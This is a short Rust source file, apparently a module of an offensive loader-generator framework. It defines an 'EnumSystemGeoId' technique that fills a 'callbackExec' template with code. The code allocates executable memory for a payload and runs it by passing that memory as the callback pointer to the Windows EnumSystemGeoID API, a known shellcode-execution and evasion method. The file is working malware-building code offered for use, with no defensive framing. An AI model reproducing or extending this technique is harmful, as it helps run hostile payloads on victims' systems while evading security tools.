use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct EnumSystemGeoId;

impl Technique for EnumSystemGeoId {
    fn meta(&self) -> &'static TechniqueMeta { &ENUM_SYSTEM_GEO_ID_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        ctx.set_template("callbackExec");
        let body = r#"
        let addr = syscall_alloc_exec(&vec);
        if addr.is_null() { return; }
        windows_sys::Win32::Globalization::EnumSystemGeoID(
            16,
            0,
            Some(std::mem::transmute(addr)),
        );
"#;
        ctx.set_replacement("{{CALLBACK_INVOKE}}", body.to_string());
        Ok(())
    }
}

pub use super::super::ENUM_SYSTEM_GEO_ID_META;
